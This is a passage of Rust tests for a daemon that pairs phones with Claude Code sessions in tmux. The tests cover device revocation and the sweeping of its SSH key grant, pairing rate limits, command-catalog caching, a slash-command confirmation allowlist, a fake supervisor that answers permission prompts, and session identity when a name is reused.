    // command an operator is told takes a device's access away, and it used to
    // leave a phone's shell exactly where it was.
    //
    // Every one of them redirects `HOME` through `FakeHome`, which is the only
    // supported way to reach a sweep from a test — see `legacy_credentials`.

    /// **The restored backup.** The daemon started, swept, and has been up ever
    /// since; the file comes back afterwards, from a Time Machine restore or a
    /// dotfiles resync. Nothing retries a startup sweep, so before this the
    /// phone kept its shell for as long as the Mac stayed booted — and the
    /// operator was told the revocation had taken everything.
    #[tokio::test]
    async fn revoking_a_device_sweeps_a_grant_that_appeared_after_startup() {
        let home = FakeHome::new("revoke-restored");
        let daemon = test_daemon();
        let device_id = paired_device(&daemon).await;

        // After the daemon is up and serving: this is the whole point.
        legacy_write(&home.keys(), MIXED, 0o600);
        daemon.revoke(&device_id).await.unwrap();

        assert_eq!(
            home.read_keys().as_deref(),
            Some(SURVIVORS),
            "the tagged pair goes and the user's own keys come through byte for byte"
        );
    }

    /// The common case, and the reason running this on every revocation is
    /// affordable: a file with nothing of ours in it is read and not written.
    #[tokio::test]
    async fn revoking_a_device_leaves_a_file_with_nothing_to_sweep_untouched() {
        let home = FakeHome::new("revoke-quiet");
        let daemon = test_daemon();
        let device_id = paired_device(&daemon).await;
        legacy_write(&home.keys(), SURVIVORS, 0o644);

        let before = std::fs::metadata(home.keys()).unwrap();
        daemon.revoke(&device_id).await.unwrap();
        let after = std::fs::metadata(home.keys()).unwrap();

        assert_eq!(home.read_keys().as_deref(), Some(SURVIVORS));
        // The inode is the proof that no replacement was renamed into place:
        // every write goes through a fresh temporary, so an untouched file is
        // the same file.
        assert_eq!(
            std::os::unix::fs::MetadataExt::ino(&before),
            std::os::unix::fs::MetadataExt::ino(&after),
            "a revoke with nothing to sweep must not rewrite the file"
        );
        let strays = home.strays();
        assert!(
            strays.is_empty(),
            "no half-written replacement either: {strays:?}"
        );
    }

    /// **A file this command does not own may not decide what it reports.** The
    /// token withdrawal is done and stored by the time the sweep runs; a
    /// revocation that failed over an unwritable `~/.ssh` would tell the
    /// operator their phone still holds a token it no longer holds, and invite a
    /// retry of something that already happened.
    #[tokio::test]
    async fn a_revoke_succeeds_when_the_sweep_cannot_rewrite_the_file() {
        let home = FakeHome::new("revoke-readonly");
        let daemon = test_daemon();
        let device_id = paired_device(&daemon).await;
        legacy_write(&home.keys(), MIXED, 0o600);
        home.seal();

        let outcome = daemon.revoke(&device_id).await.unwrap();

        assert!(
            outcome.token_revoked,
            "the withdrawal that did happen is what this reports"
        );
        assert!(!daemon.store.device_is_active(&device_id).unwrap());
        assert_eq!(
            home.read_keys().as_deref(),
            Some(MIXED),
            "a failed replacement leaves the original whole"
        );
    }

    /// **The retry, which is the only one an operator has short of restarting
    /// the daemon.** The sweep is best-effort, and the two ways it fails on a
    /// file it can see — `~/.ssh` unwritable, the file rewritten underneath it —
    /// both tell the operator to run `codeconnect revoke` again. That advice is
    /// worth nothing if the second call short-circuits on a device whose token
    /// is already gone: the sweep is unconditional, or the documented recovery
    /// path does not exist.
    #[tokio::test]
    async fn revoking_an_already_revoked_device_sweeps_again() {
        let home = FakeHome::new("revoke-twice");
        let daemon = test_daemon();
        let device_id = paired_device(&daemon).await;

        // The first revocation takes the token, over a Mac that has no such
        // file at all — the sweep runs and finds nothing.
        let first = daemon.revoke(&device_id).await.unwrap();
        assert!(first.token_revoked);
        assert!(home.read_keys().is_none(), "there was nothing to sweep yet");

        // And then the grant comes back — a restore, a resync, or an `~/.ssh`
        // that was unwritable at the first attempt and is not now.
        legacy_write(&home.keys(), MIXED, 0o600);
        let second = daemon.revoke(&device_id).await.unwrap();

        assert!(
            !second.token_revoked,
            "the token was already gone, and the command still reports honestly"
        );
        assert_eq!(
            home.read_keys().as_deref(),
            Some(SURVIVORS),
            "the sweep runs on a device that was already revoked, or the retry an operator \
             is told to run does nothing"
        );
    }

    #[tokio::test]
    async fn pairing_attempts_are_capped_inside_the_window() {
        // A pairing code has real entropy and lives five minutes, so this is
        // not what stops a guess — it is what stops an *unbounded number* of
        // guesses. The safety argument for a short-lived code is "you cannot
        // try enough of them in five minutes", and that is only true if
        // something is counting. Nothing was.
        let daemon = daemon_with(Config {
            pairing_max_attempts: 3,
            pairing_window_secs: 300,
            ..Config::default()
        });
        for attempt in 0..3 {
            let outcome = hello_with_code(&daemon, "AAAA-BBBB").await;
            assert!(
                matches!(outcome, AuthOutcome::Rejected(ref why) if why.contains("unknown")),
                "attempt {attempt} should have been an ordinary rejection: {outcome:?}"
            );
        }
        // The fourth is refused before the store is consulted at all.
        match hello_with_code(&daemon, "AAAA-BBBB").await {
            AuthOutcome::Rejected(why) => assert!(
                why.contains("too many"),
                "the limiter must be what refuses this one: {why}"
            ),
            other => panic!("a fourth attempt must be refused: {other:?}"),
        }

        // And a *real* code is refused too, which is the point: the window has
        // to close for everybody or it closes for nobody.
        let (code, _) = daemon.create_pairing(300).await.unwrap();
        assert!(matches!(
            hello_with_code(&daemon, &code).await,
            AuthOutcome::Rejected(_)
        ));
    }

    #[tokio::test]
    async fn a_successful_pairing_does_not_count_against_the_limit() {
        // A phone pairing normally must never push the daemon towards its own
        // limit, or a household with several devices would lock itself out.
        let daemon = daemon_with(Config {
            pairing_max_attempts: 2,
            pairing_window_secs: 300,
            ..Config::default()
        });
        for _ in 0..5 {
            let (code, _) = daemon.create_pairing(300).await.unwrap();
            assert!(matches!(
                hello_with_code(&daemon, &code).await,
                AuthOutcome::Paired { .. }
            ));
        }
    }

    #[tokio::test]
    async fn the_window_reopens_once_the_failures_age_out() {
        let daemon = daemon_with(Config {
            pairing_max_attempts: 2,
            // One second, so the test measures the sliding window rather than
            // waiting out a production-sized one.
            pairing_window_secs: 1,
            ..Config::default()
        });
        for _ in 0..2 {
            assert!(matches!(
                hello_with_code(&daemon, "AAAA-BBBB").await,
                AuthOutcome::Rejected(_)
            ));
        }
        assert!(
            !daemon
                .admit_pairing_attempt(protocol::time::now_unix_ms())
                .await
        );
        // Far enough past the window that the two recorded failures fall out.
        let later = protocol::time::now_unix_ms() + 1_500;
        assert!(
            daemon.admit_pairing_attempt(later).await,
            "a sliding window that never reopens is a lockout, not a rate limit"
        );
    }

    #[tokio::test]
    async fn a_zero_limit_disables_the_limiter() {
        let daemon = daemon_with(Config {
            pairing_max_attempts: 0,
            ..Config::default()
        });
        for _ in 0..50 {
            assert!(matches!(
                hello_with_code(&daemon, "AAAA-BBBB").await,
                AuthOutcome::Rejected(ref why) if why.contains("unknown")
            ));
        }
    }

    // --------------------------------------------------- session identity

    /// Register a supervisor the way the ipc server does, minus the socket.
    async fn register(daemon: &Arc<Daemon>, name: &str, uid: Option<&str>) -> Registration {
        register_speaking(daemon, name, uid, protocol::PROTOCOL_MINOR).await
    }

    /// The same, at a chosen feature level — a supervisor left behind by an
    /// in-place upgrade reports the minor it was built with.
    async fn register_speaking(
        daemon: &Arc<Daemon>,
        name: &str,
        uid: Option<&str>,
        protocol_minor: u32,
    ) -> Registration {
        // Bounded exactly as the ipc server's is, so a test cannot pass on a
        // queue depth the daemon never has.
        let (tx, rx) = mpsc::channel(protocol::config::Config::default().ipc_write_queue);
        // Kept alive so the handle looks attached; nothing here sends to it.
        Box::leak(Box::new(rx));
        daemon
            .register_supervisor(
                RegisterSession {
                    session_id: name.to_string(),
                    session_uid: uid.map(str::to_string),
                    tmux_session: name.to_string(),
                    tmux_socket: protocol::TMUX_SOCKET_NAME.to_string(),
                    cwd: "/tmp".to_string(),
                    supervisor_pid: 4242,
                    claude_bin: None,
                    started_at: protocol::time::now_rfc3339(),
                    protocol_minor,
                },
                tx,
                Arc::new(std::sync::Mutex::new(HashMap::new())),
            )
            .await
            .expect("registration must succeed")
    }

    /// The same, reporting the executable it launched — what the command
    /// catalog reads.
    async fn register_with_claude_bin(
        daemon: &Arc<Daemon>,
        name: &str,
        uid: Option<&str>,
        claude_bin: &std::path::Path,
    ) -> Registration {
        let (tx, rx) = mpsc::channel(protocol::config::Config::default().ipc_write_queue);
        Box::leak(Box::new(rx));
        daemon
            .register_supervisor(
                RegisterSession {
                    session_id: name.to_string(),
                    session_uid: uid.map(str::to_string),
                    tmux_session: name.to_string(),
                    tmux_socket: protocol::TMUX_SOCKET_NAME.to_string(),
                    cwd: "/tmp".to_string(),
                    supervisor_pid: 4242,
                    claude_bin: Some(claude_bin.display().to_string()),
                    started_at: protocol::time::now_rfc3339(),
                    protocol_minor: protocol::PROTOCOL_MINOR,
                },
                tx,
                Arc::new(std::sync::Mutex::new(HashMap::new())),
            )
            .await
            .expect("registration must succeed")
    }

    #[tokio::test]
    async fn the_command_catalog_is_read_once_per_binary_and_cached() {
        let daemon = daemon_with_patient_catalog_probe();
        // The fake counts its own invocations, so the cache claim is a
        // measured fact rather than an implementation hope.
        let bin = crate::catalog::test_bin::answering_binary();
        let count = bin.parent().unwrap().join("count");
        let script = format!(
            "echo run >> {}\ncat <<'CCEOF'\n{}\nCCEOF\nsleep 30\n",
            count.display(),
            crate::catalog::test_bin::MEASURED_INIT.trim_end()
        );
        std::fs::write(&bin, format!("#!/bin/sh\n{script}")).unwrap();

        let registration = register_with_claude_bin(&daemon, "cc-7", None, &bin).await;
        let uid = registration.session.uid.clone();

        let first = daemon.command_catalog(&uid).await;
        let protocol::ws::CommandCatalogResult::Available {
            commands,
            claude_version,
            probed_at,
        } = first
        else {
            panic!("first read must be available: {first:?}");
        };
        assert!(commands.iter().any(|c| c == "model"));
        assert_eq!(claude_version.as_deref(), Some("2.1.221"));

        let second = daemon.command_catalog(&uid).await;
        let protocol::ws::CommandCatalogResult::Available {
            probed_at: second_probed_at,
            ..
        } = second
        else {
            panic!("second read must be available");
        };
        assert_eq!(
            probed_at, second_probed_at,
            "a cache hit reports when the fact was read, not when it was asked for"
        );
        let runs = std::fs::read_to_string(&count).unwrap_or_default();
        assert_eq!(runs.lines().count(), 1, "one binary, one probe: {runs:?}");
    }

    /// Recovery is paid for by slash commands only — prose cannot open a
    /// Mac view, and a path is not a command.
    #[test]
    fn only_word_shaped_slash_commands_ask_for_recovery() {
        for text in [
            "/status",
            "/model sonnet",
            "  /clear",
            "/deep-research x",
            "/a-b_c",
        ] {
            assert!(is_word_shaped_slash_command(text), "{text}");
        }
        for text in ["hello", "", "/", "/tmp/build.log", "look at /status", "/ x"] {
            assert!(!is_word_shaped_slash_command(text), "{text}");
        }
    }

    /// The allowlist that stands between a client's flag and a **committing**
    /// keystroke. `Enter` selects whatever is highlighted, so everything this
    /// function refuses is a key that is never pressed.
    #[test]
    fn only_model_with_one_ascii_graphic_argument_gets_a_confirmation_needle() {
        assert_eq!(
            confirmation_needle("/model sonnet").as_deref(),
            Some("❯1.yes,switchtosonnet"),
            "the needle binds the selection marker, the affirmative row and the value"
        );
        assert_eq!(
            confirmation_needle("  /MODEL Opus").as_deref(),
            Some("❯1.yes,switchtoopus"),
            "leading space and case are the command's, not the needle's"
        );
        // Measured: `/effort` opens the identical shape and echoes its argument
        // verbatim, so it shares the needle rather than growing a second one.
        assert_eq!(
            confirmation_needle("/effort low").as_deref(),
            Some("❯1.yes,switchtolow")
        );
        for text in [
            // Not a command whose confirmation the phone discloses.
            "/clear",
            "/status",
            "hello",
            // Bare: Claude Code's own chooser, where the highlighted row is
            // whatever it happens to be.
            "/model",
            "/model   ",
            "/effort",
            // Not one printable word: a payload that did not make one command
            // must never authorise one key.
            "/model two words",
            "/model with\ttab",
            "/model line\nbreak",
            "/model café",
        ] {
            assert_eq!(confirmation_needle(text), None, "{text:?}");
        }
    }

    /// Consent and the allowlist both have to agree. Dropping either hands a
    /// committing keystroke to a case that never authorised it. The third
    /// condition — the supervisor's capability — is checked at dispatch, under
    /// the lock that fetches the handle.
    #[test]
    fn a_confirmation_is_forwarded_only_with_consent_an_allowlisted_command_and_a_minor_10_supervisor(
    ) {
        assert_eq!(
            confirm_view_for("/model sonnet", true).as_deref(),
            Some("❯1.yes,switchtosonnet")
        );
        // The client never showed anybody what this costs.
        assert_eq!(confirm_view_for("/model sonnet", false), None);
        // Consent, but not a command the daemon will complete.
        assert_eq!(confirm_view_for("/clear", true), None);
        assert_eq!(confirm_view_for("/model", true), None);
    }

    /// Three names, no rule: a kept snapshot is a picture of somebody's
    /// screen, and the general version of the idea was rejected by design.
    #[test]
    fn only_the_three_snapshot_commands_keep_a_pane() {
        for text in ["/status", "/usage", "  /COST"] {
            assert!(snapshot_command(text), "{text}");
        }
        for text in ["/model", "/clear", "/status extra", "/statuses", "hello"] {
            assert!(!snapshot_command(text), "{text}");
        }
    }

    #[tokio::test]
    async fn concurrent_catalog_asks_share_one_probe() {
        let daemon = daemon_with_patient_catalog_probe();
        let bin = crate::catalog::test_bin::answering_binary();
        let count = bin.parent().unwrap().join("count");
        let script = format!(
            "echo run >> {}\nsleep 0.2\ncat <<'CCEOF'\n{}\nCCEOF\nsleep 30\n",
            count.display(),
            crate::catalog::test_bin::MEASURED_INIT.trim_end()
        );
        std::fs::write(&bin, format!("#!/bin/sh\n{script}")).unwrap();

        let registration = register_with_claude_bin(&daemon, "cc-9", None, &bin).await;
        let uid = registration.session.uid.clone();

        let (first, second) =
            tokio::join!(daemon.command_catalog(&uid), daemon.command_catalog(&uid));
        for result in [first, second] {
            assert!(
                matches!(result, protocol::ws::CommandCatalogResult::Available { .. }),
                "{result:?}"
            );
        }
        let runs = std::fs::read_to_string(&count).unwrap_or_default();
        assert_eq!(
            runs.lines().count(),
            1,
            "two simultaneous askers must share one child: {runs:?}"
        );
    }

    #[tokio::test]
    async fn concurrent_failed_asks_share_one_probe_too() {
        let daemon = daemon_with_patient_catalog_probe();
        let bin = crate::catalog::test_bin::answering_binary();
        let count = bin.parent().unwrap().join("count");
        // Counts its runs, then exits without ever saying init: a failure.
        let script = format!("echo run >> {}\nsleep 0.2\nexit 0\n", count.display());
        std::fs::write(&bin, format!("#!/bin/sh\n{script}")).unwrap();

        let registration = register_with_claude_bin(&daemon, "cc-10", None, &bin).await;
        let uid = registration.session.uid.clone();

        let (first, second) =
            tokio::join!(daemon.command_catalog(&uid), daemon.command_catalog(&uid));
        for result in [first, second] {
            assert!(
                matches!(
                    result,
                    protocol::ws::CommandCatalogResult::Unavailable { .. }
                ),
                "{result:?}"
            );
        }
        let runs = std::fs::read_to_string(&count).unwrap_or_default();
        assert_eq!(
            runs.lines().count(),
            1,
            "a failure answers its waiters too — one child, not one each: {runs:?}"
        );
    }

    #[tokio::test]
    async fn a_session_without_a_reported_binary_gets_a_complete_unavailable() {
        let daemon = test_daemon();
        let registration = register(&daemon, "cc-8", None).await;
        let result = daemon.command_catalog(&registration.session.uid).await;
        let protocol::ws::CommandCatalogResult::Unavailable { reason } = result else {
            panic!("no binary, no catalog: {result:?}");
        };
        assert!(reason.contains("did not report"), "{reason}");
    }

    #[tokio::test]
    async fn an_unknown_session_gets_an_unavailable_not_an_error() {
        let daemon = test_daemon();
        let result = daemon.command_catalog("u-never-existed").await;
        assert!(matches!(
            result,
            protocol::ws::CommandCatalogResult::Unavailable { .. }
        ));
    }

    // ------------------------------------------------------ fake supervisor

    /// Verbatim shape of a live permission prompt on claude 2.1.220. Only the
    /// command differs between the two.
    fn permission_pane(command: &str) -> String {
        format!(
            " Bash command\n   {command}\n   Run this command\n\n Do you want to proceed?\n \
             ❯ 1. Yes\n   2. Yes, and always allow\n   3. No\n \
             Esc to cancel · Tab to amend · ctrl+e to explain"
        )
    }

    /// A live composer with nothing typed into it, captured with
    /// `tmux capture-pane -p -J` on claude 2.1.232.
    const COMPOSER_PANE: &str =
        include_str!("../../../fixtures/panes/composer/manual-shortcuts.txt");

    /// A supervisor that actually answers, over a screen the test controls.
    ///
    /// It makes its decisions with the same `protocol::ipc` functions the real
    /// supervisor calls — prompt presence, then prompt fingerprint — because a
    /// harness that re-implements the interlock would be testing its own copy of
    /// it. What it adds is a *split screen*: `scrollback` is only ever returned
    /// for a capture that did not ask for the visible pane, which is how these
    /// tests can tell "read the screen" from "read the history".
    struct FakeSupervisor {
        visible: Arc<std::sync::Mutex<String>>,
        typed: Arc<std::sync::Mutex<Vec<String>>>,
        captures: Arc<std::sync::Mutex<Vec<bool>>>,
        /// `targets_composer` for every injection the daemon asked for, in
        /// order. Recorded rather than acted on: the flag decides whether the
        /// *supervisor* asks tmux for the cursor, which is a question no fake
        /// screen can answer, so what the daemon owes is the right value.
        aimed_at_composer: Arc<std::sync::Mutex<Vec<bool>>>,
        /// When set, injections are swallowed without a reply — a supervisor
        /// that typed and then stopped answering, which is indistinguishable
        /// from one that never typed at all.
        silent: Arc<std::sync::atomic::AtomicBool>,
        /// The very map `supervisor_request` inserts into, so a test can assert
        /// that a request which was never answered left nothing behind.
        inflight: Arc<std::sync::Mutex<HashMap<String, oneshot::Sender<SupervisorResult>>>>,
        /// Held so the daemon keeps seeing this supervisor as attached for as
        /// long as the test holds the handle.
        _registration: Registration,
    }

    impl FakeSupervisor {
        fn show(&self, pane: &str) {
            *self.visible.lock().unwrap() = pane.to_string();
        }

        /// How many requests this supervisor still has outstanding.
        fn inflight_len(&self) -> usize {
            self.inflight.lock().unwrap().len()
        }

        /// Stop answering injections. Nothing here records whether it typed,
        /// because the daemon cannot know either — that is the whole point.
        fn go_silent(&self) {
            self.silent.store(true, std::sync::atomic::Ordering::SeqCst);
        }

        fn typed(&self) -> Vec<String> {
            self.typed.lock().unwrap().clone()
        }

        /// `visible_only` for every capture the daemon asked for, in order.
        fn captures(&self) -> Vec<bool> {
            self.captures.lock().unwrap().clone()
        }

        /// `targets_composer` for every injection the daemon asked for, in
        /// order.
        fn aimed_at_composer(&self) -> Vec<bool> {
            self.aimed_at_composer.lock().unwrap().clone()
        }
    }

    async fn attach(
        daemon: &Arc<Daemon>,
        name: &str,
        uid: &str,
        visible: &str,
        scrollback: &str,
    ) -> FakeSupervisor {
        attach_speaking(
            daemon,
            name,
            uid,
            visible,
            scrollback,
            protocol::PROTOCOL_MINOR,
        )
        .await
    }

    async fn attach_speaking(
        daemon: &Arc<Daemon>,
        name: &str,
        uid: &str,
        visible: &str,
        scrollback: &str,
        protocol_minor: u32,
    ) -> FakeSupervisor {
        let (tx, mut rx) =
            mpsc::channel::<DaemonFrame>(protocol::config::Config::default().ipc_write_queue);
        let inflight: Arc<std::sync::Mutex<HashMap<String, oneshot::Sender<SupervisorResult>>>> =
            Arc::new(std::sync::Mutex::new(HashMap::new()));
        let visible_cell = Arc::new(std::sync::Mutex::new(visible.to_string()));
        let typed = Arc::new(std::sync::Mutex::new(Vec::new()));
        let captures = Arc::new(std::sync::Mutex::new(Vec::new()));
        let aimed_at_composer = Arc::new(std::sync::Mutex::new(Vec::new()));
        let silent = Arc::new(std::sync::atomic::AtomicBool::new(false));
        let history = scrollback.to_string();

        {
            let inflight = Arc::clone(&inflight);
            let visible_cell = Arc::clone(&visible_cell);
            let typed = Arc::clone(&typed);
            let captures = Arc::clone(&captures);
            let aimed_at_composer = Arc::clone(&aimed_at_composer);
            let silent = Arc::clone(&silent);
            tokio::spawn(async move {
                while let Some(frame) = rx.recv().await {
                    let DaemonFrame::SupervisorRequest { id, request } = frame else {
                        continue;
                    };
                    let on_screen = visible_cell.lock().unwrap().clone();
                    let result = match request {
                        SupervisorRequest::Ping => SupervisorResult::Pong,
                        SupervisorRequest::Capture { visible_only, .. } => {
                            captures.lock().unwrap().push(visible_only);
                            SupervisorResult::Snapshot {
                                text: if visible_only {
                                    on_screen
                                } else {
                                    format!("{history}\n{on_screen}")
                                },
                            }
                        }
                        SupervisorRequest::SendText {
                            text,
                            require,
                            expect,
                            ..
                        } if silent.load(std::sync::atomic::Ordering::SeqCst) => {
                            let _ = (text, require, expect);
                            continue;
                        }
                        SupervisorRequest::SendText {
                            text,
                            require,
                            expect,
                            targets_composer,
                            ..
                        } => {
                            aimed_at_composer.lock().unwrap().push(targets_composer);
                            match require.find_match(&on_screen, None) {
                                None => SupervisorResult::Refused {
                                    reason: "expected prompt not on screen".into(),
                                },
                                Some(matched) => {
                                    if expect
                                        .as_ref()
                                        .is_some_and(|expect| !expect.still_on_screen(&on_screen))
                                    {
                                        SupervisorResult::Refused {
                                            reason: "the prompt on screen is not the one this \
                                                     answer was created for"
                                                .into(),
                                        }
                                    } else {
                                        typed.lock().unwrap().push(text);
                                        SupervisorResult::Sent { matched }
                                    }
                                }
                            }
                        }
                    };
                    if let Some(responder) = inflight.lock().unwrap().remove(&id) {
                        let _ = responder.send(result);
                    }
                }
            });
        }

        let registration = daemon
            .register_supervisor(
                RegisterSession {
                    session_id: name.to_string(),
                    session_uid: Some(uid.to_string()),
                    tmux_session: name.to_string(),
                    tmux_socket: protocol::TMUX_SOCKET_NAME.to_string(),
                    cwd: "/tmp".to_string(),
                    supervisor_pid: 4242,
                    claude_bin: None,
                    started_at: protocol::time::now_rfc3339(),
                    protocol_minor,
                },
                tx,
                Arc::clone(&inflight),
            )
            .await
            .expect("registration must succeed");

        FakeSupervisor {
            visible: visible_cell,
            typed,
            captures,
            aimed_at_composer,
            silent,
            inflight,
            _registration: registration,
        }
    }

    /// Raise a structured permission request the way the hook does.
    async fn raise_prompt(
        daemon: &Arc<Daemon>,
        uid: &str,
        prompt_id: &str,
        command: &str,
    ) -> String {
        raise_prompt_in(daemon, "cc-1", uid, prompt_id, command).await
    }

    /// The same, for a named run — so a test can hold two runs at once.
    async fn raise_prompt_in(
        daemon: &Arc<Daemon>,
        session_id: &str,
        uid: &str,
        prompt_id: &str,
        command: &str,
    ) -> String {
        let tool_input = json!({ "command": command });
        daemon
            .handle_hook(HookPost {
                session_id: session_id.into(),
                session_uid: Some(uid.to_string()),
                event: "PermissionRequest".into(),
                payload: json!({
                    "hook_event_name": "PermissionRequest",
                    "cwd": "/tmp",
                    "prompt_id": prompt_id,
                    "tool_name": "Bash",
                    "tool_input": tool_input,
                }),
                wait: false,
            })
            .await;
        format!(
            "pr-{prompt_id}-{}",
            &protocol::hash::approval_payload_hash("Bash", &tool_input)[..16]
        )
    }

    /// Wait until the daemon has fingerprinted the prompt for this card.
    async fn wait_bound(daemon: &Arc<Daemon>, uid: &str, request_id: &str) -> bool {
        for _ in 0..40 {
            {
                let inner = daemon.inner.lock().await;
                if inner
                    .pending
                    .get(&(uid.to_string(), request_id.to_string()))
                    .is_some_and(|entry| entry.prompt.is_some())
                {
                    return true;
                }
            }
            tokio::time::sleep(Duration::from_millis(25)).await;
        }
        false
    }

    async fn tool_call(daemon: &Arc<Daemon>, name: &str, uid: &str, tool_use_id: &str) {
        daemon
            .handle_hook(HookPost {
                session_id: name.into(),
                session_uid: Some(uid.to_string()),
                event: "PreToolUse".into(),
                payload: json!({
                    "hook_event_name": "PreToolUse",
                    "cwd": "/tmp",
                    "tool_name": "Bash",
                    "tool_input": {"command": "echo hi"},
                    "tool_use_id": tool_use_id,
                }),
                wait: false,
            })
            .await;
    }

    #[tokio::test]
    async fn a_new_cc_1_gets_its_own_identity_log_and_numbering() {
        // Name reuse, end to end through the daemon: spawn `cc-1`, kill it,
        // spawn `cc-1` again. Two runs, two uids, two logs, no interleaving.
        let daemon = test_daemon();

        let first = register(&daemon, "cc-1", Some("01K1B3XQ8ZC0DE5FGH7JKMNPQR")).await;
        for i in 0..4 {
            tool_call(&daemon, "cc-1", &first.session.uid, &format!("toolu_a{i}")).await;
        }
        daemon
            .session_exited("cc-1", Some(&first.session.uid), Some(0))
            .await;

        let second = register(&daemon, "cc-1", Some("01K1B3XZZZC0DE5FGH7JKMNPQR")).await;
        for i in 0..2 {
            tool_call(&daemon, "cc-1", &second.session.uid, &format!("toolu_b{i}")).await;
        }

        assert_ne!(
            first.session.uid, second.session.uid,
            "two runs, two identities"
        );
        assert_eq!(
            first.session.name, second.session.name,
            "…sharing one tmux name"
        );

        // Two logs. The new run starts at 1 rather than continuing from where
        // the dead one stopped.
        let old: Vec<u64> = daemon
            .store
            .events_after(&first.session.uid, 0, 100)
            .unwrap()
            .iter()
            .map(|e| e.seq)
            .collect();
        let new: Vec<u64> = daemon
            .store
            .events_after(&second.session.uid, 0, 100)
            .unwrap()
            .iter()
            .map(|e| e.seq)
            .collect();
        assert_eq!(old, (1..=old.len() as u64).collect::<Vec<_>>());
        assert_eq!(new, (1..=new.len() as u64).collect::<Vec<_>>());
        assert!(new.len() < old.len(), "the new run has only its own events");

        // No interleaving: every event in each log names its own run, and the
        // dead run gained nothing after the new one started.
        for event in daemon
            .store
            .events_after(&first.session.uid, 0, 100)
            .unwrap()
        {
            assert_eq!(event.session_uid, first.session.uid);
            assert!(
                !event
                    .source_event_id
                    .as_deref()
                    .unwrap_or("")
                    .contains("toolu_b"),
                "the dead run must not gain the live run's events: {event:?}"
            );
        }
        for event in daemon
            .store
            .events_after(&second.session.uid, 0, 100)
            .unwrap()
        {
            assert_eq!(event.session_uid, second.session.uid);
            assert!(!event
                .source_event_id
                .as_deref()
                .unwrap_or("")
                .contains("toolu_a"));
        }

        // Both are listed, distinguishable, with independent watermarks.
        let sessions = daemon.sessions().await.unwrap();
        assert_eq!(sessions.len(), 2);
        assert!(sessions.iter().all(|s| s.session_id == "cc-1"));
        let uids: Vec<&str> = sessions.iter().map(|s| s.session_uid.as_str()).collect();
        assert!(
            uids.contains(&first.session.uid.as_str())
                && uids.contains(&second.session.uid.as_str())
        );
        assert_eq!(
            sessions
                .iter()
                .find(|s| s.session_uid == first.session.uid)
                .unwrap()
                .lifecycle,
            Lifecycle::Exited
        );

        // And a client that only knows the name reaches the live one.
        assert_eq!(
            daemon.resolve("cc-1").await.unwrap().session_uid,
            second.session.uid
        );
    }

    #[test]
    fn the_launchd_sentinel_is_not_mistaken_for_a_job() {
        // Guards a sentence, and the debugging it would cause: macOS hands a
        // shell-started process `XPC_SERVICE_NAME=0`, and reporting that as a
        // label makes `codeconnect daemon status` claim a hand-started daemon belongs to
        // "a different job (0)".
        //
        // `XPC_SERVICE_NAME` is process-global and these tests run in threads,
        // and one other test writes it: `main`'s
        // `only_codeconnects_own_launchd_job_counts_as_something_that_would_restart_it`,
        // which asserts what `managed_by_codeconnect_job` makes of the same
        // values. Two writers with no lock between them read each other's
        // settings, so both take [`crate::LaunchdLabelEnv`] — the same one — and
        // it restores what was there when the last of them lets go.
        let env = crate::LaunchdLabelEnv::take();

        env.set(Some("0"));
        assert_eq!(launchd_label(), None, "0 means 'not an XPC service'");
        env.set(Some(""));
        assert_eq!(launchd_label(), None);
        env.set(None);
        assert_eq!(launchd_label(), None);

        // A real label is passed through, ours or not — "managed by somebody
        // else" is a distinct problem and must stay visible.
        env.set(Some(protocol::LAUNCHD_LABEL));
        assert_eq!(launchd_label().as_deref(), Some(protocol::LAUNCHD_LABEL));
        env.set(Some("com.example.other"));
        assert_eq!(launchd_label().as_deref(), Some("com.example.other"));
    }

    #[tokio::test]
    async fn a_bare_name_resolves_to_the_run_that_is_actually_there() {
        // `lifecycle` can be stale: a session that ended while the daemon was
        // down was never observed exiting, so it is still recorded `Live` and
        // would outrank the run a human means by `cc-1`. A supervisor being
        // attached is the only positive evidence, and it wins.
        let daemon = test_daemon();

        // An older run that looks alive on paper and has nothing behind it.
        let ghost = register(&daemon, "cc-1", Some("01K1B3XQ8ZC0DE5FGH7JKMNPQR")).await;
        daemon.unregister_supervisor(&ghost).await;
        assert_eq!(
            daemon
                .store
                .get_session(&ghost.session.uid)
                .unwrap()
                .unwrap()
                .lifecycle,
            Lifecycle::Live,
            "the ghost is still recorded live, which is the whole problem"
        );

        // A newer run that is genuinely attached.
        let live = register(&daemon, "cc-1", Some("01K1B3XZZZC0DE5FGH7JKMNPQR")).await;
        assert_eq!(
            daemon.resolve("cc-1").await.unwrap().session_uid,
            live.session.uid
        );

        // With nothing attached, the store's policy takes over — and a uid is
        // always exact, whatever is attached.
        daemon.unregister_supervisor(&live).await;
        assert!(daemon.resolve("cc-1").await.is_ok());
        assert_eq!(
            daemon
                .resolve(&ghost.session.uid)
                .await
                .unwrap()
                .session_uid,
            ghost.session.uid
        );
        assert!(daemon.resolve("cc-9").await.is_err());
    }

    #[tokio::test]
    async fn a_supervisor_s_old_connection_cannot_detach_its_new_one() {
        // A supervisor whose link drops reconnects and registers again under the
        // same uid. The losing connection's teardown can land afterwards, and
        // removing the slot by uid alone would detach the supervisor that had
        // just replaced it — leaving a live session that cannot be typed into
        // and a `detached` link that never recovers.
        let daemon = test_daemon();
        let first = register(&daemon, "cc-1", Some("01K1B3XQ8ZC0DE5FGH7JKMNPQR")).await;
        let second = register(&daemon, "cc-1", Some("01K1B3XQ8ZC0DE5FGH7JKMNPQR")).await;
        assert_eq!(first.session.uid, second.session.uid, "one run, two links");

        daemon.unregister_supervisor(&first).await;
        assert_eq!(
            daemon.sessions().await.unwrap()[0].link,
            Link::Attached,
            "the reconnected supervisor must still hold the session"
        );

        // The current registration releases it, as it should.
        daemon.unregister_supervisor(&second).await;
        assert_eq!(daemon.sessions().await.unwrap()[0].link, Link::Detached);
    }

    #[tokio::test]
    async fn a_hook_without_a_uid_continues_a_live_run_but_never_a_dead_one() {
        // The in-place upgrade path (a session whose settings file predates the
        // flag) and the restart path, which must not be the same answer.
        let daemon = test_daemon();
        let live = register(&daemon, "cc-1", Some("01K1B3XQ8ZC0DE5FGH7JKMNPQR")).await;

        daemon
            .handle_hook(HookPost {
                session_id: "cc-1".into(),
                session_uid: None,
                event: "PreToolUse".into(),
                payload: json!({
                    "hook_event_name": "PreToolUse",
                    "cwd": "/tmp",
                    "tool_use_id": "toolu_legacy",
                }),
                wait: false,
            })
            .await;
        assert_eq!(
            daemon.store.max_seq(&live.session.uid).unwrap(),
            2,
            "a uid-less hook must continue the live run, not fork it"
        );
        assert_eq!(daemon.sessions().await.unwrap().len(), 1);

        // Once that run has exited, the same hook is a *new* run: `cc-1` having
